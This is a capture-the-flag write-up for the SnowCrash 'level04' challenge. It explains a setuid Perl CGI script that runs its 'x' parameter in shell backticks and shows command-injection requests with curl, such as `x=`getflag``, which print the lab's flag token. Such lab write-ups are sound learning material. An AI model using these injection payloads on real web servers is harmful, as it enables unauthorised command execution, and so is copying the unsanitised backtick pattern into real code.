# LEVEL 04

In our home directory, we have a perl script with suid/guid owned by flag04 (the first s is for SETUID, and the second s is for SETGID):
```
>$ ls -la
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```
let's read the file's content:
```
>$ cat level04.pl
#!/usr/bin/perl // Indicates the path of the interpreter, like for bash (#!/bin/bash).
# localhost:4747 // This program is executed from a web server hosted on local machine and reachable via the port 4747.

use CGI qw{param}; // CGI (Common Gateway Interface) is a protocol for executing scripts via web requests.
print "Content-type: text/html\n\n"; // Print the string when it's execute.
sub x { // Define function 'x'.
  $y = $_[0]; // Save the param of x function to the variable y.
  print `echo $y 2>&1`; // Perl runs code between backticks/quotes as shell commands ('2>&1' is for error handling).
}
x(param("x")); // First x is the function declared above, second x is the key pass to param function.
```
We therefore know that we should pass one word as x.
If that word is a string like "hi", it should be output when running the program:
```
>$ ./level04.pl x="hamza elamri"
Content-type: text/html

hamza elamri
```
And we can pass a command and ensure it's run and its output captured and echoed using backticks/quotes "``":
```
level04@SnowCrash:~$ ./level04.pl x=`whoami`
Content-type: text/html

level04
```
since the suid bit should make the script run as flag04.
This is because, as of perl 5.14.0, suid/guid bits on scripts are ignored by perl due to security reasons:
```
>$ perl --version
This is perl 5, version 14, subversion 2 (v5.14.2) built for i686-linux-gnu-thread-multi-64int
```
but if we run it on port 4747 as instructed:
```
>$ curl '127.0.0.1:4747/level04.pl?x=`whoami`'
flag04
```
```
So if we replace `whoami` with `getflag`:
>$ curl '127.0.0.1:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
We can also tape on a navigator:  `http://{VM_IP}:4747/?x=$(getflag)`  
**$(getflag)** or **\`getflag`** bot works


#### Vulnerability:
Command substitution on argument provided by privileged user -> Privilege escalation via **CGI** (**C**ommon **G**ateway **I**nterface) code injection.
as the [HOLY WIKIPEDIA](https://en.wikipedia.org/wiki/Common_Gateway_Interface) says : `In computing, Common Gateway Interface (CGI) is an interface specification that enables web servers to execute an external program, typically to process user requests.`

#### Documentations:
1. https://www.geeksforgeeks.org/setuid-setgid-and-sticky-bits-in-linux-file-permissions/
1. https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Command-Substitution
1. https://mattmccutchen.net/suidperl.html
1. http://www.ouah.org/hackingcgi.htm
1. http://www.cgi101.com/book/ch1/text.html
1. https://curl.haxx.se/docs/manual.html